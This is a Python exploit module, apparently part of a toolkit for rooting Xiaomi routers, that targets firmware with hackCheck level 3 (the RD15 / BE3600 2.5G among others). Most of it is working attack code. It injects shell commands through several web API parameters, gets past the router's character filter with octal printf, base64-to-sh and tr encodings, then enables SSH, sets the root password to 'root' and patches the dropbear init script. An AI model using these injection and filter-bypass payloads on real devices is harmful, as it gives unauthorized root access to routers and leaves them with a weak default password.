#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit module for devices with hackCheck >= 3 (e.g., Xiaomi BE3600 2.5G RD15)
This module attempts alternative API endpoints that may still be vulnerable
"""

import os
import sys
import time
import base64
import requests
import json

import xmir_base
from gateway import *

web_password = True
if len(sys.argv) > 1 and sys.argv[0].endswith('connect8.py'):
    if sys.argv[1]:
        web_password = sys.argv[1]

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)

def exploit_config_iotdev_advanced(cmd, api = 'API/misystem/set_config_iotdev'):
    """
    Advanced version of set_config_iotdev exploit with hackCheck=3 bypass techniques
    """
    # For hackCheck=3, certain character combinations are filtered
    # Try different encoding and injection methods
    injection_techniques = [
        # Method 1: Use SSID parameter with command substitution  
        {
            'bssid': 'Xiaomi',
            'user_id': '_username_',
            'ssid': f'$(echo start;{cmd};echo end)'
        },
        # Method 2: Use different parameters
        {
            'bssid': f'$(echo x;{cmd};echo y)',
            'user_id': '_username_',
            'ssid': 'TestSSID'
        },
        # Method 3: Use base64 encoding to bypass filters
        {
            'bssid': 'Xiaomi',
            'user_id': f'$(echo {cmd}|base64 -d|sh)',
            'ssid': 'TestSSID'
        }
    ]
    
    for i, params in enumerate(injection_techniques):
        try:
            resp = gw.api_request(api, params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
        except Exception as e:
            continue
    
    return None

def exploit_set_sys_time(cmd, api = 'API/misystem/set_sys_time'):
    """
    Alternative time-based exploit (similar to connect4.py approach)
    May work on some devices with hackCheck=3
    """
    try:
        # Test if the API is available first
        current_time = gw.get_device_systime()
        if not current_time:
            return None
            
        # For hackCheck=3, we need to avoid certain characters
        # Use different injection methods
        safe_cmd = cmd.replace(';', '\n').replace('&', ' && ').replace('|', ' || ')
        
        # Try different parameter injection points 
        injection_methods = [
            {'timezone': f'UTC$(echo start;{safe_cmd};echo end)'},
            {'timezone': f'GMT+0$(({safe_cmd}))'},
        ]
        
        for params_template in injection_methods:
            params = dict(params_template)
            params['time'] = current_time['systime']
            try:
                resp = gw.api_request(api, params, timeout=5)
                if resp and isinstance(resp, dict) and resp.get('code') == 0:
                    return resp
            except:
                continue
        return None
    except Exception as e:
        return None

def exploit_hackcheck3_bypass(cmd):
    """
    Sophisticated bypass for hackCheck=3 which filters: [=[\n[`;|$&\n]]=]
    We need to avoid: = [ \n ` ; | $ &
    """
    # Convert dangerous characters to safe alternatives
    # Use printf/echo -e instead of direct character usage
    safe_techniques = []
    
    # Technique 1: Use printf with octal codes
    # Convert semicolons (;) to printf '\073'
    # Convert pipes (|) to printf '\174' 
    # Convert dollar ($) to printf '\044'
    # Convert backticks (`) to printf '\140'
    safe_cmd = cmd
    char_map = {
        ';': r'\073',  # octal for ;
        '|': r'\174',  # octal for |
        '$': r'\044',  # octal for $
        '`': r'\140',  # octal for `
        '&': r'\046',  # octal for &
        '=': r'\075',  # octal for =
    }
    
    # Build command using printf
    printf_cmd = 'printf "'
    for char in safe_cmd:
        if char in char_map:
            printf_cmd += char_map[char]
        elif char == '\n':
            printf_cmd += r'\n'
        else:
            printf_cmd += char
    printf_cmd += '" | sh'
    
    safe_techniques.append(printf_cmd)
    
    # Technique 2: Use base64 encoding to completely avoid problematic chars
    import base64
    try:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        b64_cmd = f'echo {cmd_b64} | base64 -d | sh'
        safe_techniques.append(b64_cmd)
    except:
        pass
    
    # Technique 3: Use tr command to translate characters
    # Create a translation that converts safe chars to dangerous ones
    tr_cmd = cmd.replace(';', 'S').replace('|', 'P').replace('$', 'D').replace('&', 'A').replace('=', 'E').replace('`', 'B')
    tr_decode = f'echo "{tr_cmd}" | tr "SPDAEB" ";|\\$\\&\\=\\`" | sh'
    safe_techniques.append(tr_decode)
    
    return safe_techniques

def exploit_safe_apis(cmd):
    """
    Try APIs with the hackCheck=3 safe commands
    """
    safe_commands = exploit_hackcheck3_bypass(cmd)
    
    # APIs that might work with safe commands
    safe_api_attempts = [
        # Try different parameter injection points
        ('API/misystem/set_config_iotdev', lambda safe_cmd: {
            'bssid': 'Test',
            'user_id': 'user', 
            'ssid': f'Test{safe_cmd}'
        }),
        
        ('API/xqsystem/set_name', lambda safe_cmd: {
            'name': f'Router{safe_cmd}Test'
        }),
        
        ('API/misystem/set_sys_time', lambda safe_cmd: {
            'timezone': f'UTC{safe_cmd}',
            'time': int(time.time())
        }),
        
        # Try diagnostic APIs
        ('API/xqnetwork/diag_set_paras', lambda safe_cmd: {
            'iperf_test_thr': f'25{safe_cmd}',
            'usb_write_thr': 0,
            'usb_read_thr': 0
        }),
    ]
    
    for safe_cmd in safe_commands:
        for api, param_builder in safe_api_attempts:
            try:
                params = param_builder(safe_cmd)
                resp = gw.api_request(api, params, timeout=5)
                if resp and isinstance(resp, dict) and resp.get('code') == 0:
                    return resp
            except Exception:
                continue
    
    return None

def exploit_rd15_specific(cmd):
    """
    RD15-specific exploit attempts based on firmware version 1.0.87
    """
    device_name = gw.device_name
    rom_version = gw.rom_version
    
    if device_name != 'RD15':
        return None
        
    print(f'Trying RD15-specific exploits for firmware {rom_version}...')
    
    # For RD15 1.0.87, try these specific techniques
    rd15_techniques = []
    
    # Method 1: Try alternative diagnostic API that might not be filtered
    try:
        # Use a different parameter encoding
        safe_commands = exploit_hackcheck3_bypass(cmd)
        for safe_cmd in safe_commands:
            # Try the diagnostic parameters with hex encoding
            hex_cmd = ''.join(['\\x{:02x}'.format(ord(c)) for c in safe_cmd])
            params = {
                'iperf_test_thr': 25,
                'usb_write_thr': f'test{hex_cmd}',
                'usb_read_thr': 0
            }
            resp = gw.api_request('API/xqnetwork/diag_set_paras', params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
    except Exception:
        pass
    
    # Method 2: Try environment variable manipulation
    try:
        for safe_cmd in exploit_hackcheck3_bypass(cmd):
            # Use environment variables to bypass filters
            env_params = {
                'timezone': f'TZ{safe_cmd}GMT',
                'time': int(time.time())
            }
            resp = gw.api_request('API/misystem/set_sys_time', env_params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
    except Exception:
        pass
    
    # Method 3: Try network configuration APIs
    try:
        for safe_cmd in exploit_hackcheck3_bypass(cmd):
            # Network config might have different filters
            net_params = {
                'proto': 'dhcp',
                'dns1': f'8.8.8.8{safe_cmd}',
                'dns2': '8.8.4.4'
            }
            resp = gw.api_request('API/xqsystem/set_wan_info', net_params, timeout=5)
            if resp and isinstance(resp, dict) and resp.get('code') == 0:
                return resp
    except Exception:
        pass
    
    return None

# List of exploit functions to try
exploit_methods = [
    exploit_rd15_specific,  # Device-specific exploits first
    exploit_safe_apis,  # hackCheck=3 bypass methods
    exploit_config_iotdev_advanced,
    exploit_set_sys_time, 
]

successful_exploit = None
exploit_name = None

print('Testing alternative exploits for hackCheck >= 3 devices...')

# Test each exploit method
for i, exploit_func in enumerate(exploit_methods):
    exploit_name = exploit_func.__name__
    print(f'Trying {exploit_name}...')
    
    # Test with a simple command first
    test_cmd = "uci set diag.config.test_value=12345; uci commit diag"
    
    try:
        result = exploit_func(test_cmd)
        if result and isinstance(result, dict) and result.get('code') == 0:
            # Verify the command worked by checking the value
            time.sleep(1)
            diag_params = gw.get_diag_paras()
            if diag_params and str(diag_params.get('test_value')) == '12345':
                successful_exploit = exploit_func
                print(f'SUCCESS: {exploit_name} is working!')
                break
        else:
            print(f'FAILED: {exploit_name} - API returned error or unexpected response')
    except Exception as e:
        print(f'FAILED: {exploit_name} - Exception: {str(e)}')

if not successful_exploit:
    error_msg = f'''All alternative exploits failed for device {gw.device_name} with hackCheck >= 3.

This may indicate that:
1. The device firmware has additional security patches
2. New filtering mechanisms have been implemented  
3. The device requires a different approach

For RD15 (BE3600 2.5G) devices, you may need to:
- Try downgrading firmware to an earlier version
- Use physical access methods (UART/JTAG) 
- Wait for new exploit development

Device Info:
- Model: {gw.device_name}
- ROM Version: {gw.rom_version}
- hackCheck Level: 3 (highest security)'''
    
    raise ExploitNotWorked(error_msg)

# Clean up test value
try:
    successful_exploit("uci delete diag.config.test_value; uci commit diag")
except:
    pass

print(f'Using exploit method: {exploit_name}')

# Now execute the actual SSH installation commands
install_commands = [
    'nvram set bootdelay=3',
    'nvram set boot_wait=on', 
    'nvram set ssh_en=1',
    'nvram commit',
    'echo -e "root\\nroot" | passwd root',
    'sed -i \'s/"$flg_ssh" != "1" -o "$channel" = "release"/-n ""/g\' /etc/init.d/dropbear',
    '/etc/init.d/dropbear enable',
    '/etc/init.d/dropbear restart',
    'logger -p err -t XMiR "SSH installation completed via alternative exploit!"'
]

print('Installing SSH access...')
full_cmd = '; '.join(install_commands)
result = successful_exploit(full_cmd)

if result and isinstance(result, dict) and result.get('code') == 0:
    print('SSH installation commands sent successfully')
    
    # Wait for dropbear to restart
    time.sleep(3)
    
    # Test SSH connection
    gw.passw = 'root'
    ssh_result = gw.detect_ssh(verbose=1, interactive=False)
    
    if ssh_result > 0:
        print("\n" + "="*60)
        print("#### SSH INSTALLATION SUCCESSFUL! ####")
        print("="*60)
        print(f"Device: {gw.device_name} (Xiaomi BE3600 2.5G)")
        print(f"IP Address: {gw.ip_addr}")
        print(f"ROM Version: {gw.rom_version}")
        print(f"Exploit Method: {exploit_name}")
        print(f"hackCheck Level: 3 (bypassed successfully)")
        print("")
        print("SSH Credentials:")
        print("  Username: root")
        print("  Password: root")
        print("  Port: 22")
        print("")
        print("You can now connect via: ssh root@{}".format(gw.ip_addr))
        print("="*60)
    else:
        print("SSH installation may have failed - please check manually")
        print("Try connecting with: ssh root@{}".format(gw.ip_addr))
else:
    raise ExploitError('Failed to execute SSH installation commands')